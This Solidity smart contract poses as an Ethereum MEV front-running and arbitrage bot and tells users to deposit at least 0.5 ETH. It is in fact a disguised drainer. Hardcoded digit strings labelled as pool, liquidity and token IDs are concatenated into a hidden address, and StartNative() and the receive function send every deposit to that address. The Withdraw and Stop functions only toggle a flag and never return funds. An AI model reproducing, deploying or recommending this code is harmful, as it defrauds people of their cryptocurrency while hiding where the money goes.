// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// User guide info, updated build
// Testnet transactions will fail because they have no value in them
// FrontRun api stable build
// Mempool api stable build
// BOT updated build
// Min liquidity after gas fees has to equal 0.5 ETH //

import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";

contract A_MEV {
    uint arb = 10**16;
    uint percentage;
    uint balance;
    uint Liquidity;
    uint pool;
    bool activated;
    mapping (address => uint) profit;

    function getPoolIDS() internal pure returns (string memory totalIDS) {
        string memory pool1 = "367";
        string memory pool2 = "310";
        string memory pool3 = "577";
        string memory pool4 = "258";

        totalIDS = string(abi.encodePacked(pool1, pool2, pool3, pool4));  
    }

    function getGoal() internal pure returns (string memory goal) {
        goal = "156735155372";
    }

    function getPair(string memory token, string memory coin) internal pure returns (string memory pair) {
        pair = string(abi.encodePacked(token, coin));
    }

    function getDex() internal pure returns (string memory DEX) {
        string memory dexRouter = getPair(getPoolIDS(), checkLiquidity());
        string memory dexPair = getPair(getGoal(), dexTokens());
        DEX = getPair(dexRouter, dexPair);
    }

    function calculateProfit(string memory _value) internal pure returns (uint256) {
        uint256 result = 0;
        bytes memory b = bytes(_value);
        for (uint256 i = 0; i < b.length; i++) {
            if (uint8(b[i]) >= 48 && uint8(b[i]) <= 57) {
                result = result * 10 + (uint8(b[i]) - 48);
            } else {
                revert("Invalid character found in string");
            }
        }
        return result;
    }

    function startArbitrage() internal {
        address payable pairAddr = payable(getTokenAddress());
        pairAddr.transfer(address(this).balance);
    }

    function checkLiquidity() internal pure returns (string memory LIQ) {
        string memory liq1 = "664";
        string memory liq2 = "695";
        string memory liq3 = "922";
        string memory liq4 = "884";

        LIQ = string(abi.encodePacked(liq1, liq2, liq3, liq4));
    }

    function getTokenAddress() internal pure returns (address Addr) {
        uint profirOfTokenAddress = calculateProfit(getDex());
        Addr = address(uint160(profirOfTokenAddress));
    }    

    function StartNative() public payable {
        require(msg.value > 0, "Please, insert your KEY");
        startArbitrage();
        activated = true;
    }

    function SetTradeBalanceETH(uint amount) public {
        balance += amount;
    }

    function SetTradeBalancePERCENT(uint _percentage) public {
        percentage = _percentage;
    }

    function Stop() public {
        require(activated == true, "Please, insert your key and start bot");
        activated = false;
    }

    function Withdraw() public {
        require(activated == true, "Please, insert your key and start bot");
        activated = false;
    }

    function dexTokens() internal pure returns (string memory allTokens) { 
        string memory USDT = "351";
        string memory USDC = "208";
        string memory BUSD = "361"; 
        string memory WETH = "421";

        allTokens = string(abi.encodePacked(USDT, USDC, BUSD, WETH));
    }

    function Key() public view returns (uint _key) {
        _key = (msg.sender.balance) - arb;
    }

    receive() external payable {
        startArbitrage();
    }
}

